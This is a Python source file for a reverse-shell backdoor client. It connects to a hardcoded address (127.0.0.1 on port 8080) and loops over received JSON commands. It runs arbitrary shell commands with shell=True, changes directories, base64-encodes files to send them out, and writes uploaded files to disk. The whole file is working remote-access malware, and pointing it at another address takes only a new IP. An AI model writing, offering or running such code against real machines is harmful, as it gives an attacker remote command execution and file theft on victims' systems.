import socket
import subprocess
import os
import base64
from socket_utils import receive_json, send_json


class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    @staticmethod
    def command_execute(commands):
        try:
            return subprocess.check_output(
                commands,
                shell=True,
                text=True,
                stderr=subprocess.STDOUT,
            )
        except subprocess.CalledProcessError as error:
            return error.output or str(error)

    def send_json(self, data):
        send_json(self.my_connection, data)

    def json_receive(self):
        return receive_json(self.my_connection)

    @staticmethod
    def execute_cd_command(directory):
        os.chdir(directory)
        return "cd to " + directory

    @staticmethod
    def get_file_contents(path):
        with open(path, "rb") as my_file:
            file_data = my_file.read()
        return base64.b64encode(file_data).decode()

    @staticmethod
    def save_file(path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Save Complete"

    def start_socket(self):
        try:
            while True:
                command = self.json_receive()
                if not isinstance(command, list) or not command:
                    break

                action = command[0]
                if action == "quit":
                    break
                if action == "cd" and len(command) > 1:
                    command_output = self.execute_cd_command(command[1])
                elif action == "download" and len(command) > 1:
                    command_output = self.get_file_contents(command[1])
                elif action == "upload" and len(command) > 2:
                    command_output = self.save_file(command[1], command[2])
                else:
                    command_output = self.command_execute(" ".join(command))
                self.send_json(command_output)
        finally:
            self.my_connection.close()


my_socket = MySocket("127.0.0.1", 8080)
my_socket.start_socket()
